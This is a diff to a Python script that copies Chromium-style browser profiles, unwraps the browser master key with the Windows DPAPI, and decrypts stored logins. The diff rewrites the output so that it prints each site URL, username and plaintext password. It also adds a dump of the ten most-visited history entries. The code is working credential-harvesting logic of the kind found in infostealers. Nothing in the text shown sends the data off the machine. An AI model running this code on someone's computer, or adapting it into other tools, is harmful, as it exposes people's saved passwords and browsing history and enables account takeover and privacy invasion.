@@ -4,13 +4,14 @@ import sys
 import shutil
 import json
 import platform
-
 import sqlite3
 
 #pip install pywin32
 from win32crypt import CryptUnprotectData
 #pip install pycryptodomex
 from Cryptodome.Cipher import AES
+#alternative: pip install pycryptodome
+#from Crypto.Cipher import AES
 
 def copyFile(sourceFolder, destinationFolder):
     if os.path.exists(sourceFolder):
@@ -80,15 +81,25 @@ for name, path in browsers.items():
         with open(f'{destinationFolder}\\..\\Local State', "wb") as f:
             f.write(master_key)
 
-        #Decrypt and print passwords####################################################
+        #Display information from the database##########################################
         conn = sqlite3.connect(f'{destinationFolder}\\Login Data')
         cursor = conn.cursor()
-        cursor.execute("SELECT * FROM logins")
-        urls = cursor.fetchall()
-        for url in urls:
-            data = decryptData(url[5], master_key)
-            if data == '':
-                continue
-            print(url[0], end=' ')
-            print(url[3], end=' ')
-            print(decryptData(url[5], master_key))
+        cursor.execute('Select origin_url, username_value, password_value From logins WHERE blacklisted_by_user = 0')
+        print(f'\n{"-"*20}Passwords{"-"*21}')
+        for row in cursor.fetchall():
+            password = decryptData(row[2], master_key)
+            print(f'URL: {row[0]}')
+            print(f'Username: {row[1]}')
+            print(f'Password: {password}')
+            print('-'*5)
+        conn.close()
+        print('-'*50)
+
+        conn = sqlite3.connect(f'{destinationFolder}\\History')
+        cursor = conn.cursor()
+        cursor.execute('Select url, title, visit_count From urls ORDER BY visit_count DESC LIMIT 10')
+        print(f'\n{"-"*21}History{"-"*22}')
+        for row in cursor.fetchall():
+            print(row)
+        print('-'*50)
+        conn.close()
